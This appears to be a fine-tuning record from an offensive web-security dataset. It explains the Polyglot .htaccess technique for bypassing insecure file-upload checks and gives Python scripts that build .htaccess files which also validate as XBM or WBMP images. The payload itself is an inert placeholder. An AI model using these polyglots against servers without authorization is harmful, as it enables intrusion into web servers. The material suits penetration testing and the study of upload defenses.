# UPLOAD — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: upload
- cwe: CWE-434

## Scenario

During a bug bounty I want to try Polyglot .htaccess for Upload Insecure Files. What are the payloads and when do they apply?

## Analysis / Response

**Polyglot .htaccess** — this technique applies to Upload Insecure Files. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

If the `exif_imagetype` function is used on the server side to determine the image type, create a `.htaccess/image` polyglot.

[Supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) and [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). In `.htaccess` ignoring lines starting with `\x00` and `#`, you can use these scripts for generate a valid `.htaccess/image` polyglot.

* Create valid `.htaccess/xbm` image

    ```python
    width = 50
    height = 50
    payload = '# .htaccess file'

    with open('.htaccess', 'w') as htaccess:
        htaccess.write('#define test_width %d\n' % (width, ))
        htaccess.write('#define test_height %d\n' % (height, ))
        htaccess.write(payload)
    ```

* Create valid `.htaccess/wbmp` image

    ```python
    type_header = b'\x00'
    fixed_header = b'\x00'
    width = b'50'
    height = b'50'
    payload = b'# .htaccess file'

    with open('.htaccess', 'wb') as htaccess:
        htaccess.write(type_header + fixed_header + width + height)
        htaccess.write(b'\n')
        htaccess.write(payload)
    ```
